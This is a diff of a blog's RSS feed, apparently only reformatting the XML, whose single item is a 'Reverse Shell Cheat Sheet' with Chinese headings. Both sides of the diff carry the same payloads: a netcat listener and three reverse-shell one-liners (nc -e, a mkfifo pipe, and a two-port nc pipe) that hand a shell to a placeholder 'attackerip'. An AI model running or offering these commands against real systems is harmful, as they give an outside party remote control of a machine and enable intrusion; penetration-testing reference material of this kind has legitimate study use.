@@ -1,32 +1,7 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Shell on WhereIsMyMind</title>
-    <link>https://hare001.github.io/tags/shell/</link>
-    <description>Recent content in Shell on WhereIsMyMind</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
-    <lastBuildDate>Tue, 30 Jun 2020 17:22:05 +0800</lastBuildDate>
-    
-	<atom:link href="https://hare001.github.io/tags/shell/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Reverse Shell Cheat Sheet</title>
-      <link>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</link>
-      <pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate>
-      
-      <guid>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</guid>
-      <description>&lt;h2 id=&#34;利用-nc-监听端口&#34;&gt;利用 nc 监听端口&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -lvp &lt;span style=&#34;color:#ae81ff&#34;&gt;2333&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nc-版本&#34;&gt;nc 版本：&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -e /bin/sh attackerip &lt;span style=&#34;color:#ae81ff&#34;&gt;2333&lt;/span&gt;
-
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style=&#34;color:#ae81ff&#34;&gt;2333&lt;/span&gt; &amp;gt;/tmp/f
-
-nc attackerip 8888|/bin/sh|nc attackerip &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
-    </item>
-    
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Shell on WhereIsMyMind</title><link>https://hare001.github.io/tags/shell/</link><description>Recent content in Shell on WhereIsMyMind</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 30 Jun 2020 17:22:05 +0800</lastBuildDate><atom:link href="https://hare001.github.io/tags/shell/index.xml" rel="self" type="application/rss+xml"/><item><title>Reverse Shell Cheat Sheet</title><link>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本：&lt;/h2>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
+nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
